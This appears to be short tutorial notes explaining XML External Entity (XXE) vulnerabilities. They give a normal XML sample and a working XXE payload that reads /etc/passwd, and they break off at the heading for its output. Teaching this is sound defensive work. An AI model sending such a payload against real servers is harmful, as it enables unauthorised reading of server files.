### **What is XXE ?**
-  XML External Entity (XXE) vulnerabilities occur when an application **processes XML input that includes a reference to an external entity.** 
- This vulnerability **can occur in any technology that parses XML**. 
- By exploiting an XXE vulnerability, an attacker can read local files on the server, interact with internal systems, or conduct denial of service attacks.
#### **How it works :**

- **Normal XML :**

```xml
<?xml version="1.0"?>
<user>
  <name>John</name>
</user>
```

- **XXE ATTACK :**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE creds [
<!ELEMENT creds ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<creds><user>&xxe;</user><password>pass</password></creds>
```

-  **Output for the above XXE ATTACK xml file**
